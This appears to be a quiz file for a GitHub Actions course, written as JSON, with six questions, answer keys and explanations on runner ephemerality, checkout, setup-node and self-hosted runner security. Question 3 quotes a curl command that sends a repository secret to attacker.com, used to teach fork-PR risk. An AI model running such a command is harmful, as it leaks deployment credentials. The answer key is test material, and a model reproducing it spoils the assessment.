@@ -1,0 +1,83 @@
+{
+  "passThreshold": 1,
+  "questions": [
+    {
+      "id": "q1",
+      "type": "single",
+      "scenario": "A developer creates a file at `/tmp/build-cache.tar.gz` during a workflow run. Ten minutes later, a new push triggers another run on the same repository. The developer's step tries to read `/tmp/build-cache.tar.gz` but gets a \"file not found\" error. What is the explanation?",
+      "options": [
+        { "id": "a", "text": "GitHub-hosted runners are ephemeral. Each job gets a fresh VM that is destroyed after the run. Files from a previous run do not persist." },
+        { "id": "b", "text": "The `/tmp` directory is cleared between steps, but files in the home directory persist." },
+        { "id": "c", "text": "The runner reuses the same VM but resets the filesystem to a clean snapshot." },
+        { "id": "d", "text": "Files in `/tmp` are automatically deleted after 5 minutes by a cron job on the runner." }
+      ],
+      "correct": ["a"],
+      "explanation": "GitHub-hosted runners provision a completely new virtual machine for every job. When the job finishes, the VM is destroyed. Nothing persists between runs. To share files across runs, use `actions/cache` or `actions/upload-artifact`. Option C is wrong because the VM is fully destroyed, not snapshotted."
+    },
+    {
+      "id": "q2",
+      "type": "single",
+      "scenario": "A workflow has this job:\n\n```yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n```\n\nThe `npm test` step fails with `npm: command not found`. The developer is confused because `ubuntu-latest` should have Node.js pre-installed. What is the most likely root cause?",
+      "options": [
+        { "id": "a", "text": "The job is missing `actions/checkout@v4` as the first step." },
+        { "id": "b", "text": "The runner image may not include the specific Node.js version needed. The developer should use `actions/setup-node@v4` to install and configure the correct version." },
+        { "id": "c", "text": "`ubuntu-latest` does not come with any programming language runtimes pre-installed." },
+        { "id": "d", "text": "The `runs-on` value should be `node-latest` instead of `ubuntu-latest`." }
+      ],
+      "correct": ["b"],
+      "explanation": "While Ubuntu runner images include some versions of Node.js, the pre-installed version may not match what the project needs. `actions/setup-node@v4` installs a specific version and adds it to `PATH`. Option C is wrong because the runner images do include many runtimes, but using setup actions gives you control over exact versions. Option D is wrong because there is no `node-latest` runner label."
+    },
+    {
+      "id": "q3",
+      "type": "single",
+      "scenario": "An organization attaches a self-hosted runner to a **public** repository. An external contributor forks the repository, adds `run: curl http://attacker.com/exfil?token=${{ secrets.DEPLOY_KEY }}` to the workflow file, and opens a Pull Request. What is the primary risk?",
+      "options": [
+        { "id": "a", "text": "The attacker gains Remote Code Execution on the self-hosted runner machine, which may be inside the organization's private network." },
+        { "id": "b", "text": "The attacker can read all repository secrets because fork PRs always have secret access." },
+        { "id": "c", "text": "The attacker can merge the PR without approval because the runner has admin access." },
+        { "id": "d", "text": "There is no risk because GitHub strips all secrets from fork PR workflow runs." }
+      ],
+      "correct": ["a"],
+      "explanation": "Self-hosted runners trust the code they execute. If a public repo allows fork PRs to trigger workflows on a self-hosted runner, the attacker can run arbitrary commands on that machine. This is especially dangerous because self-hosted runners often sit inside corporate networks with access to internal services. Option D is partially true for secrets (GitHub does strip them on fork PRs by default), but the runner itself is still compromised because the attacker controls the script."
+    },
+    {
+      "id": "q4",
+      "type": "single",
+      "scenario": "A team debates whether to use GitHub-hosted runners or self-hosted runners for their CI pipeline. Their build requires access to a private database server at `10.0.1.50:5432` inside their VPC. Which is the strongest argument for using self-hosted runners?",
+      "options": [
+        { "id": "a", "text": "Self-hosted runners are faster because they have better hardware." },
+        { "id": "b", "text": "Self-hosted runners can be placed inside the private network, giving them direct access to internal resources like the database. GitHub-hosted runners run on GitHub's infrastructure and cannot reach private VPC addresses by default." },
+        { "id": "c", "text": "GitHub-hosted runners do not support Linux operating systems." },
+        { "id": "d", "text": "Self-hosted runners are free, while GitHub-hosted runners always cost money." }
+      ],
+      "correct": ["b"],
+      "explanation": "The primary advantage of self-hosted runners is network placement. They can be deployed inside your VPC, data center, or private network, giving them direct access to internal databases, registries, and APIs that GitHub-hosted runners cannot reach. Option A is sometimes true but is not the strongest argument. Option C is wrong. Option D is misleading because GitHub offers free minutes on hosted runners for public repos."
+    },
+    {
+      "id": "q5",
+      "type": "single",
+      "scenario": "A workflow runs `npm test` but fails with `ENOENT: no such file or directory, open 'package.json'`. The `package.json` exists in the repository root. The developer checks the workflow:\n\n```yaml\nsteps:\n  - run: npm test\n```\n\nWhat is missing?",
+      "options": [
+        { "id": "a", "text": "The `actions/checkout@v4` step. Without it, the runner's workspace directory is empty because the repository code is not cloned onto the VM." },
+        { "id": "b", "text": "The `working-directory` key. The runner starts in the wrong directory by default." },
+        { "id": "c", "text": "The `npm ci` step. You must install dependencies before running tests." },
+        { "id": "d", "text": "The `package.json` must be committed to a branch named `main` for the runner to see it." }
+      ],
+      "correct": ["a"],
+      "explanation": "The runner provisions a clean VM with an empty workspace. The `actions/checkout` action clones the repository into the workspace directory (`$GITHUB_WORKSPACE`). Without it, no source code exists on the runner. Option C would also cause a failure, but the error message specifically says `package.json` is missing, which points to checkout, not dependency installation."
+    },
+    {
+      "id": "q6",
+      "type": "multiple",
+      "scenario": "A team is hardening their self-hosted runner setup for a private repository. Which of the following measures reduce the attack surface?",
+      "options": [
+        { "id": "a", "text": "Run the runner inside an ephemeral container or VM that is destroyed after each job." },
+        { "id": "b", "text": "Restrict the runner to private repositories only, never attach it to public repos." },
+        { "id": "c", "text": "Give the runner machine root-level access to the production database for convenience." },
+        { "id": "d", "text": "Use runner groups with repository-level access controls to limit which repos can target the runner." }
+      ],
+      "correct": ["a", "b", "d"],
+      "explanation": "Ephemeral runners (option A) prevent state leakage between jobs. Restricting to private repos (option B) prevents fork-based RCE attacks. Runner groups (option D) enforce access control. Option C is the opposite of hardening and would massively increase the blast radius of any compromise."
+    }
+  ]
+}
